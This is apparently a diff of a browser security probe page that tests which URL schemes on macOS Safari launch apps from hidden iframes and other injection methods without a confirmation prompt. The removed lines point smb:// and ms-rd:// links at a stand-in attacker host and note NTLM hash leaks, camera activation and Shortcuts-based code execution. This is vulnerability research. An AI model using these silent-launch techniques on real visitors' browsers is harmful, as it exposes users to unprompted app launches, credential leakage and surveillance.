@@ -3,295 +3,286 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>URL Scheme Launch Probe — macOS Safari</title>
+<title>URL scheme launch matrix</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
 body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0d1117;color:#c9d1d9;padding:12px;font-size:14px}
-.card{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:15px;max-width:760px;margin:0 auto 12px}
+.card{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:15px;max-width:800px;margin:0 auto 12px}
 h2{font-size:16px;color:#58a6ff;margin-bottom:3px}
-h3{font-size:12px;text-transform:uppercase;letter-spacing:.05em;color:#8b949e;margin:14px 0 5px}
+h3{font-size:12px;color:#8b949e;margin:12px 0 4px;text-transform:uppercase;letter-spacing:.05em}
 .sub{font-size:11px;color:#8b949e;line-height:1.55;margin-bottom:10px}
 .verdict{border-radius:10px;padding:13px;margin:10px 0;font-weight:700;text-align:center;font-size:13px;line-height:1.5}
 .v-bad{background:#2d1214;color:#ff7b72}.v-ok{background:#0f5323;color:#7ee787}.v-wait{background:#21262d;color:#8b949e}.v-info{background:#3d2c00;color:#e3b341}
-.e{border:1px solid #21262d;border-left-width:3px;border-radius:6px;padding:8px 10px;margin:4px 0;font-size:12px;cursor:pointer}
-.e:hover{background:#1c2128}
-.e.launched{border-left-color:#f85149;background:#2d1214}
-.e.blocked{border-left-color:#3fb950;opacity:.7}
-.e.untested{border-left-color:#e3b341}
-.e .n{font-weight:650;display:flex;justify-content:space-between;align-items:center}
-.e .d{font-family:ui-monospace,monospace;font-size:11px;color:#8b949e;margin-top:2px}
-.tag{font-size:10px;padding:2px 6px;border-radius:4px;font-weight:600}
-.tag-crit{background:#f85149;color:#fff}.tag-high{background:#e3b341;color:#000}.tag-med{background:#30363d;color:#8b949e}
-.tag-launched{background:#f85149;color:#fff}.tag-blocked{background:#3fb950;color:#000}.tag-unknown{background:#21262d;color:#8b949e}
-button{border:none;border-radius:8px;padding:11px;font-size:13px;font-weight:600;color:#fff;background:#1f6feb;margin-top:7px;width:100%}
-button.alt{background:#30363d}button.danger{background:#c0202c}
-pre{background:#010409;border-radius:6px;padding:8px;font-size:10.5px;max-height:300px;overflow:auto;color:#8b949e;margin-top:8px;white-space:pre-wrap}
-.stats{display:flex;gap:12px;flex-wrap:wrap;margin:10px 0}
-.stat{background:#21262d;border-radius:8px;padding:8px 12px;text-align:center;min-width:80px}
-.stat .num{font-size:20px;font-weight:700}.stat .lbl{font-size:10px;color:#8b949e}
+button{border:none;border-radius:8px;padding:10px;font-size:13px;font-weight:600;color:#fff;background:#1f6feb;margin:3px 0;width:100%}
+button.alt{background:#30363d}button.danger{background:#c0202c}button.sm{width:auto;padding:6px 12px;font-size:11px;display:inline-block;margin:2px}
+pre{background:#010409;border-radius:6px;padding:8px;font-size:10.5px;max-height:200px;overflow:auto;color:#8b949e;margin-top:8px;white-space:pre-wrap}
+code{background:#21262d;padding:1px 5px;border-radius:4px;font-size:.85em}
+table{width:100%;border-collapse:collapse;font-size:11px;margin:8px 0}
+th,td{border:1px solid #21262d;padding:4px 6px;text-align:center}
+th{background:#161b22;color:#8b949e;font-weight:600}
+td.launched{background:#2d1214;color:#ff7b72;font-weight:700}
+td.blocked{background:#0f5323;color:#7ee787}
+td.prompted{background:#3d2c00;color:#e3b341}
+td.pending{background:#21262d;color:#484f58}
+.warn-box{background:#2d1214;border:1px solid #f85149;border-radius:8px;padding:10px;font-size:12px;margin:8px 0;color:#ff7b72}
 </style>
 </head>
 <body>
 <div class="card">
-  <h2>URL Scheme Launch Probe</h2>
-  <p class="sub">Tests which macOS URL schemes Safari launches <b>without a confirmation prompt</b>
-  via <code>iframe src=</code> (the stealthiest injection method).
-  <br><br>Confirmed: <code>facetime://</code> and <code>tel://</code> launch via iframe without prompt.
-  This probes <b>every dangerous scheme</b> registered on macOS to find which others follow the same pattern.
-  <br><br>Detection: <code>window.blur</code> fires when an external app takes focus.
-  Each probe runs for 3s, then reports launched/blocked.</p>
+  <h2>URL Scheme Launch Matrix</h2>
+  <p class="sub">Tests which URL schemes launch external apps from a web page, and via which injection method.
+  Safari is supposed to block subframes from launching apps (Safari 9+ restriction), but Apple's built-in
+  telephony schemes (<code>facetime://</code>, <code>tel://</code>) appear to bypass this.
+  <br><br>The critical question: do <b>all</b> registered URL schemes launch from iframes, or only
+  Apple's built-in ones? If <code>shortcuts://</code> launches from an iframe without prompt,
+  a web page can execute arbitrary automation on the user's Mac.</p>
 
-  <div class="stats" id="stats"></div>
-  <div class="verdict v-wait" id="verdict">idle</div>
-
-  <div style="margin:8px 0">
-    <label style="font-size:12px;color:#8b949e">Method (from ft.html results):</label>
-    <select id="method" style="width:100%;background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:8px;color:#c9d1d9;font-size:13px;margin:4px 0">
-      <option value="anchor">anchor.click() — confirmed NO PROMPT for facetime/tel</option>
-      <option value="iframe">iframe src= — confirmed NO PROMPT for facetime/tel</option>
-      <option value="location">location.href= — confirmed NO PROMPT for facetime/tel</option>
-      <option value="open">window.open() — SHOWS PROMPT (control)</option>
-    </select>
+  <div class="warn-box">
+    This probe launches external apps on your system. Only run on your own device.
+    Each test opens one app — close it and return to continue.
   </div>
-  <p class="sub" style="color:#e3b341">Click each scheme individually. Do NOT auto-run — Safari detects rapid sequential scheme launches and starts prompting for all of them.</p>
 
-  <div id="out"></div>
+  <div class="verdict v-wait" id="verdict">idle — pick a scheme or run the matrix</div>
+
+  <h3>Apple built-in (telephony)</h3>
+  <div id="apple-btns"></div>
+
+  <h3>Apple system apps</h3>
+  <div id="system-btns"></div>
+
+  <h3>Third-party apps</h3>
+  <div id="third-btns"></div>
+
+  <h3>Dangerous (automation / remote access)</h3>
+  <div id="danger-btns"></div>
+
+  <h3>Injection method (for individual tests)</h3>
+  <div id="method-btns"></div>
+
+  <button class="danger" onclick="runMatrix()">Run full matrix (all schemes x iframe only)</button>
+  <button class="alt" onclick="copyResults()">Copy results JSON</button>
+
+  <div id="matrix-container"></div>
   <pre id="log"></pre>
 </div>
 
-<div id="sandbox" style="position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;overflow:hidden"></div>
+<div id="sandbox" style="position:absolute;left:-9999px;top:-9999px"></div>
 
 <script>
 const T0 = performance.now();
 const L = [];
+const RESULTS = [];
+let currentMethod = 'iframe';
+
 function lg(m) {
   L.push(`[+${String(Math.round(performance.now()-T0)).padStart(5)}ms] ${m}`);
-  document.getElementById('log').textContent = L.slice(-60).join('\n');
+  document.getElementById('log').textContent = L.slice(-40).join('\n');
 }
 
-const SCHEMES = [
-  {scheme:'shortcuts', url:'shortcuts://run-shortcut?name=TestShortcut', risk:'critical',
-   note:'Apple Shortcuts — can run shell scripts, access files, make HTTP requests. Web→RCE if no prompt.'},
-  {scheme:'shortcuts-production', url:'shortcuts-production://run-shortcut?name=TestShortcut', risk:'critical',
-   note:'Production variant of Shortcuts URL scheme.'},
-  {scheme:'workflow', url:'workflow://run-workflow?name=Test', risk:'critical',
-   note:'Legacy Automator workflow — predecessor to Shortcuts, can run shell commands.'},
-  {scheme:'applescript', url:'applescript://com.apple.scripteditor?action=new&script=display%20dialog%20%22test%22', risk:'critical',
-   note:'AppleScript — full system automation access if it can run scripts.'},
-  {scheme:'ssh', url:'ssh://localhost', risk:'high',
-   note:'Opens Terminal with SSH connection. Could connect to attacker-controlled server.'},
-  {scheme:'vnc', url:'vnc://localhost', risk:'high',
-   note:'Screen Sharing — remote desktop connection.'},
-  {scheme:'smb', url:'smb://evil.example.com/share', risk:'high',
-   note:'Mounts network share — could mount attacker-controlled SMB share, NTLM hash leak.'},
-  {scheme:'sftp', url:'sftp://localhost', risk:'high',
-   note:'SFTP connection via Terminal.'},
-  {scheme:'telnet', url:'telnet://localhost', risk:'high',
-   note:'Telnet connection — plaintext, attacker-controlled server sees all input.'},
-  {scheme:'x-apple.systempreferences', url:'x-apple.systempreferences://com.apple.preference.security', risk:'high',
-   note:'Opens specific System Settings pane. Could open Privacy/Security to social-engineer changes.'},
-  {scheme:'itms-services', url:'itms-services://?action=download-manifest&url=https://example.com/manifest.plist', risk:'high',
-   note:'Enterprise app installation — installs .ipa from attacker manifest.'},
-  {scheme:'zoommtg', url:'zoommtg://zoom.us/join?confno=1234567890', risk:'high',
-   note:'Auto-joins Zoom meeting. Camera+mic activate on join.'},
-  {scheme:'zoomus', url:'zoomus://zoom.us/join?confno=1234567890', risk:'high',
-   note:'Alternative Zoom scheme — same as zoommtg.'},
-  {scheme:'facetime', url:'facetime://test@example.com', risk:'high',
-   note:'CONFIRMED: launches without prompt. Camera preview activates.'},
-  {scheme:'facetime-audio', url:'facetime-audio://test@example.com', risk:'high',
-   note:'FaceTime audio call — mic activates on connect.'},
-  {scheme:'facetime-group', url:'facetime-group://test@example.com', risk:'high',
-   note:'Group FaceTime — camera activates.'},
-  {scheme:'facetime-open-link', url:'facetime-open-link://test@example.com', risk:'high',
-   note:'FaceTime link variant.'},
-  {scheme:'tel', url:'tel://+15551234567', risk:'medium',
-   note:'CONFIRMED: launches without prompt (control test).'},
-  {scheme:'imessage', url:'imessage://test@example.com', risk:'medium',
-   note:'Opens iMessage compose — could pre-fill message to attacker.'},
-  {scheme:'sms', url:'sms://+15551234567', risk:'medium',
-   note:'Opens Messages with number.'},
-  {scheme:'mailto', url:'mailto:test@example.com?subject=test&body=sensitive_data', risk:'medium',
-   note:'Opens mail compose — could exfiltrate via pre-filled body/attachments.'},
-  {scheme:'maps', url:'maps://?q=current+location', risk:'medium',
-   note:'Opens Maps — location tracking if it reveals current location.'},
-  {scheme:'slack', url:'slack://open', risk:'medium',
-   note:'Opens Slack — deeplinks could navigate to specific channels/messages.'},
-  {scheme:'discord', url:'discord://discord.com/channels/@me', risk:'medium',
-   note:'Opens Discord.'},
-  {scheme:'findmy', url:'findmy://items', risk:'medium',
-   note:'Opens Find My — reveals device locations.'},
-  {scheme:'notes', url:'notes://showNote?id=test', risk:'medium',
-   note:'Opens Notes app — could reveal note contents.'},
-  {scheme:'music', url:'music://play', risk:'low',
-   note:'Opens Music app.'},
-  {scheme:'photos-navigation', url:'photos-navigation://album', risk:'medium',
-   note:'Opens Photos with navigation — reveals photo library.'},
-  {scheme:'prefs', url:'prefs://privacy', risk:'medium',
-   note:'Opens Preferences/Settings.'},
-  {scheme:'ms-rd', url:'ms-rd://full%20address=s:evil.example.com', risk:'high',
-   note:'Microsoft Remote Desktop — connects to attacker RDP server.'},
-  {scheme:'rdp', url:'rdp://full%20address=s:evil.example.com', risk:'high',
-   note:'Remote Desktop Protocol — connects to attacker server.'},
-  {scheme:'deskcam', url:'deskcam://start', risk:'high',
-   note:'Unknown camera-related scheme — investigate.'},
-  {scheme:'diagnostics', url:'diagnostics://start', risk:'medium',
-   note:'System diagnostics — could reveal system info.'},
-];
+const SCHEMES = {
+  apple: [
+    {scheme:'facetime', url:'facetime://localhost', label:'facetime://'},
+    {scheme:'facetime-audio', url:'facetime-audio://localhost', label:'facetime-audio://'},
+    {scheme:'tel', url:'tel://0000000000', label:'tel://'},
+    {scheme:'sms', url:'sms://0000000000', label:'sms://'},
+    {scheme:'mailto', url:'mailto:test@test.com', label:'mailto://'},
+    {scheme:'maps', url:'maps://?q=test', label:'maps://'},
+    {scheme:'imessage', url:'imessage://test@test.com', label:'imessage://'},
+  ],
+  system: [
+    {scheme:'prefs', url:'prefs://', label:'prefs://'},
+    {scheme:'x-apple.systempreferences', url:'x-apple.systempreferences://', label:'systemprefs://'},
+    {scheme:'photos', url:'photos://', label:'photos://'},
+    {scheme:'music', url:'music://', label:'music://'},
+    {scheme:'findmy', url:'findmy://', label:'findmy://'},
+    {scheme:'shortcuts', url:'shortcuts://', label:'shortcuts://'},
+    {scheme:'shortcuts-production', url:'shortcuts-production://run-shortcut?name=test', label:'shortcuts-run://'},
+  ],
+  third: [
+    {scheme:'slack', url:'slack://open', label:'slack://'},
+    {scheme:'discord', url:'discord://', label:'discord://'},
+    {scheme:'zoommtg', url:'zoommtg://zoom.us/join?confno=0000000', label:'zoommtg://'},
+    {scheme:'vscode', url:'vscode://file/tmp/test', label:'vscode://'},
+    {scheme:'tg', url:'tg://resolve?domain=test', label:'tg://'},
+    {scheme:'whatsapp', url:'whatsapp://send?text=test', label:'whatsapp://'},
+    {scheme:'fb', url:'fb://profile', label:'fb://'},
+    {scheme:'claude', url:'claude://open', label:'claude://'},
+  ],
+  danger: [
+    {scheme:'vnc', url:'vnc://127.0.0.1', label:'vnc://'},
+    {scheme:'telnet', url:'telnet://127.0.0.1', label:'telnet://'},
+    {scheme:'smb', url:'smb://127.0.0.1', label:'smb://'},
+    {scheme:'ms-rd', url:'ms-rd://full%20address=s:127.0.0.1', label:'ms-rd://'},
+  ],
+};
 
-const results = {};
-let running = false;
+const METHODS = ['iframe','location','anchor','open','meta'];
 
-function renderEntry(s) {
-  const div = document.createElement('div');
-  div.className = 'e untested';
-  div.id = 'e-' + s.scheme;
-  div.innerHTML = `
-    <div class="n">
-      <span>${s.scheme}://</span>
-      <span class="tag tag-${s.risk}">${s.risk.toUpperCase()}</span>
-    </div>
-    <div class="d">${s.note}</div>
-    <div class="d" id="r-${s.scheme}" style="margin-top:4px;color:#58a6ff"></div>
-  `;
-  div.onclick = () => testOne(s);
-  return div;
-}
+function buildButtons() {
+  Object.entries(SCHEMES).forEach(([cat, schemes]) => {
+    const id = cat === 'apple' ? 'apple-btns' :
+      cat === 'system' ? 'system-btns' : cat === 'third' ? 'third-btns' : 'danger-btns';
+    const container = document.getElementById(id);
+    schemes.forEach(s => {
+      const b = document.createElement('button');
+      b.className = 'sm alt';
+      b.textContent = s.label;
+      b.onclick = () => runProbe(s.scheme, s.url, currentMethod);
+      container.appendChild(b);
+    });
+  });
 
-function renderAll() {
-  const out = document.getElementById('out');
-  out.innerHTML = '';
-  const groups = {critical:[], high:[], medium:[], low:[]};
-  SCHEMES.forEach(s => groups[s.risk].push(s));
-  for (const [risk, items] of Object.entries(groups)) {
-    if (!items.length) continue;
-    const h = document.createElement('h3');
-    h.textContent = `${risk} impact (${items.length})`;
-    out.appendChild(h);
-    items.forEach(s => out.appendChild(renderEntry(s)));
-  }
-}
-
-async function testOne(s) {
-  if (running) return;
-  return probe(s);
-}
-
-function probe(s) {
-  return new Promise(resolve => {
-    const method = document.getElementById('method').value;
-    const sandbox = document.getElementById('sandbox');
-    const rdiv = document.getElementById('r-' + s.scheme);
-    const ediv = document.getElementById('e-' + s.scheme);
-    let launched = false;
-
-    lg(`probing ${s.scheme}:// via ${method}`);
-    rdiv.textContent = `testing via ${method}...`;
-
-    const onBlur = () => {
-      launched = true;
-      const ms = Math.round(performance.now() - t0);
-      results[s.scheme] = {launched: true, ms, method};
-      rdiv.innerHTML = `<span style="color:#ff7b72;font-weight:700">LAUNCHED in ${ms}ms via ${method} — NO PROMPT!</span>`;
-      ediv.className = 'e launched';
-      lg(`${s.scheme}: LAUNCHED at +${ms}ms via ${method}`);
+  const mc = document.getElementById('method-btns');
+  METHODS.forEach(m => {
+    const b = document.createElement('button');
+    b.className = 'sm' + (m === currentMethod ? '' : ' alt');
+    b.textContent = m;
+    b.id = 'mbtn-' + m;
+    b.onclick = () => {
+      currentMethod = m;
+      METHODS.forEach(x => {
+        document.getElementById('mbtn-'+x).className = 'sm' + (x === m ? '' : ' alt');
+      });
     };
-
-    window.addEventListener('blur', onBlur);
-    const t0 = performance.now();
-
-    try {
-      switch(method) {
-        case 'anchor': {
-          const a = document.createElement('a');
-          a.href = s.url;
-          a.textContent = s.scheme;
-          a.style.cssText = 'position:absolute;left:-9999px';
-          document.body.appendChild(a);
-          a.click();
-          setTimeout(() => { try { document.body.removeChild(a); } catch(e) {} }, 100);
-          break;
-        }
-        case 'iframe': {
-          const f = document.createElement('iframe');
-          f.style.cssText = 'width:1px;height:1px;border:0;position:absolute;left:-9999px';
-          f.src = s.url;
-          sandbox.appendChild(f);
-          break;
-        }
-        case 'location': {
-          location.href = s.url;
-          break;
-        }
-        case 'open': {
-          window.open(s.url, '_blank');
-          break;
-        }
-      }
-    } catch(e) {
-      lg(`${s.scheme}: ERROR ${e.name}: ${e.message}`);
-      rdiv.innerHTML = `<span style="color:#e3b341">error: ${e.name}</span>`;
-    }
-
-    setTimeout(() => {
-      window.removeEventListener('blur', onBlur);
-      try { sandbox.innerHTML = ''; } catch(e) {}
-      if (!launched) {
-        results[s.scheme] = {launched: false, method};
-        rdiv.innerHTML = `<span style="color:#7ee787">blocked via ${method} (3s timeout)</span>`;
-        ediv.className = 'e blocked';
-        lg(`${s.scheme}: blocked via ${method}`);
-      }
-      updateStats();
-      resolve(results[s.scheme]);
-    }, 3000);
+    mc.appendChild(b);
   });
 }
 
-// No auto-run — Safari's heuristic detects rapid sequential scheme launches
-// and starts prompting for ALL of them. Click each one individually.
+function runProbe(scheme, url, method) {
+  const sandbox = document.getElementById('sandbox');
+  sandbox.innerHTML = '';
+  lg(`probe: ${scheme}:// via ${method}`);
 
-function updateStats() {
-  const launched = Object.values(results).filter(r => r.launched).length;
-  const blocked = Object.values(results).filter(r => !r.launched).length;
-  const total = SCHEMES.length;
-  const untested = total - launched - blocked;
-  document.getElementById('stats').innerHTML = `
-    <div class="stat"><div class="num" style="color:#ff7b72">${launched}</div><div class="lbl">LAUNCHED</div></div>
-    <div class="stat"><div class="num" style="color:#7ee787">${blocked}</div><div class="lbl">Blocked</div></div>
-    <div class="stat"><div class="num">${untested}</div><div class="lbl">Untested</div></div>
-    <div class="stat"><div class="num">${total}</div><div class="lbl">Total</div></div>
-  `;
-}
+  const t0 = performance.now();
+  let settled = false;
 
-function finalize() {
-  const launched = Object.entries(results).filter(([k,v]) => v.launched);
-  const critLaunched = launched.filter(([k]) => SCHEMES.find(s=>s.scheme===k)?.risk === 'critical');
-  const highLaunched = launched.filter(([k]) => SCHEMES.find(s=>s.scheme===k)?.risk === 'high');
-  const v = document.getElementById('verdict');
+  const onBlur = () => {
+    if (settled) return;
+    settled = true;
+    const ms = Math.round(performance.now() - t0);
+    lg(`BLUR +${ms}ms — ${scheme}:// LAUNCHED via ${method}`);
+    recordResult(scheme, method, ms < 3000 ? 'launched' : 'prompted', ms);
+  };
 
-  if (critLaunched.length) {
-    v.className = 'verdict v-bad';
-    v.innerHTML = `${critLaunched.length} CRITICAL scheme(s) launched without prompt:<br>` +
-      critLaunched.map(([k]) => `<b>${k}://</b>`).join(', ') +
-      `<br><span style="font-weight:400;font-size:12px">${launched.length} total schemes launched. ${highLaunched.length} high-impact.</span>`;
-  } else if (highLaunched.length) {
-    v.className = 'verdict v-bad';
-    v.innerHTML = `${highLaunched.length} HIGH-impact scheme(s) launched without prompt:<br>` +
-      highLaunched.map(([k]) => `<b>${k}://</b>`).join(', ');
-  } else if (launched.length) {
-    v.className = 'verdict v-info';
-    v.textContent = `${launched.length} scheme(s) launched: ${launched.map(([k])=>k).join(', ')}`;
-  } else {
-    v.className = 'verdict v-ok';
-    v.textContent = 'All tested schemes were blocked.';
+  window.addEventListener('blur', onBlur, {once: true});
+
+  try {
+    switch(method) {
+      case 'iframe': {
+        const f = document.createElement('iframe');
+        f.style.cssText = 'width:1px;height:1px;border:0';
+        f.src = url;
+        sandbox.appendChild(f);
+        break;
+      }
+      case 'location': {
+        setTimeout(() => { location.href = url; }, 50);
+        break;
+      }
+      case 'anchor': {
+        const a = document.createElement('a');
+        a.href = url;
+        a.style.display = 'none';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        break;
+      }
+      case 'open': {
+        window.open(url, '_blank');
+        break;
+      }
+      case 'meta': {
+        const f = document.createElement('iframe');
+        f.style.cssText = 'width:1px;height:1px;border:0';
+        f.srcdoc = '<html><head><meta http-equiv="refresh" content="0;url=' + url + '"></head></html>';
+        sandbox.appendChild(f);
+        break;
+      }
+    }
+  } catch(e) {
+    lg(`ERROR: ${e.name}: ${e.message}`);
+    if (!settled) { settled = true; recordResult(scheme, method, 'error', 0); }
   }
-  updateStats();
-  lg('done — ' + launched.length + ' launched, ' + (Object.keys(results).length - launched.length) + ' blocked');
+
+  setTimeout(() => {
+    window.removeEventListener('blur', onBlur);
+    if (!settled) {
+      settled = true;
+      lg(`${scheme}:// via ${method}: BLOCKED (4s timeout)`);
+      recordResult(scheme, method, 'blocked', 4000);
+    }
+  }, 4000);
 }
 
-renderAll();
-updateStats();
-lg('ready — click a scheme to test individually, or run all');
+function recordResult(scheme, method, status, ms) {
+  const existing = RESULTS.findIndex(r => r.scheme === scheme && r.method === method);
+  const entry = {scheme, method, status, ms, ts: Date.now()};
+  if (existing >= 0) RESULTS[existing] = entry;
+  else RESULTS.push(entry);
+  updateMatrix();
+  updateVerdict();
+}
+
+function updateVerdict() {
+  const v = document.getElementById('verdict');
+  const launched = RESULTS.filter(r => r.status === 'launched');
+  const blocked = RESULTS.filter(r => r.status === 'blocked');
+  if (launched.length === 0 && blocked.length === 0) return;
+  const launchedSchemes = [...new Set(launched.map(r => r.scheme))];
+  v.className = launched.length ? 'verdict v-bad' : 'verdict v-ok';
+  v.innerHTML = launched.length
+    ? `${launched.length} launch(es): ${launchedSchemes.map(s=>s+'://').join(', ')}`
+    : `All tested schemes blocked (${blocked.length} tests)`;
+}
+
+function updateMatrix() {
+  const mc = document.getElementById('matrix-container');
+  if (RESULTS.length === 0) return;
+  const schemes = [...new Set(RESULTS.map(r => r.scheme))];
+  const methods = [...new Set(RESULTS.map(r => r.method))];
+  let html = '<table><tr><th>scheme</th>';
+  methods.forEach(m => html += '<th>' + m + '</th>');
+  html += '</tr>';
+  schemes.forEach(s => {
+    html += '<tr><td style="text-align:left;font-weight:600">' + s + '://</td>';
+    methods.forEach(m => {
+      const r = RESULTS.find(x => x.scheme === s && x.method === m);
+      if (!r) { html += '<td class="pending">-</td>'; return; }
+      html += '<td class="' + r.status + '">' + r.status + '</td>';
+    });
+    html += '</tr>';
+  });
+  html += '</table>';
+  mc.innerHTML = html;
+}
+
+async function runMatrix() {
+  const v = document.getElementById('verdict');
+  v.className = 'verdict v-info';
+  v.textContent = 'Running matrix — close apps as they open...';
+  const allSchemes = Object.values(SCHEMES).flat();
+  for (const s of allSchemes) {
+    runProbe(s.scheme, s.url, 'iframe');
+    await new Promise(r => setTimeout(r, 5000));
+  }
+  lg('matrix complete');
+  updateVerdict();
+}
+
+function copyResults() {
+  const data = {
+    ua: navigator.userAgent, origin: location.origin,
+    context: /Telegram/i.test(navigator.userAgent) ? 'Telegram' :
+      /Safari/i.test(navigator.userAgent) && !/Chrome/i.test(navigator.userAgent) ? 'Safari' : 'Other',
+    results: RESULTS, ts: Date.now()
+  };
+  navigator.clipboard?.writeText(JSON.stringify(data, null, 2))
+    .then(() => lg('copied')).catch(() => lg('copy failed'));
+}
+
+buildButtons();
+lg('ready — ' + (/Safari/i.test(navigator.userAgent) && !/Chrome/i.test(navigator.userAgent) ? 'Safari' : 'Other'));
 </script>
 </body>
 </html>
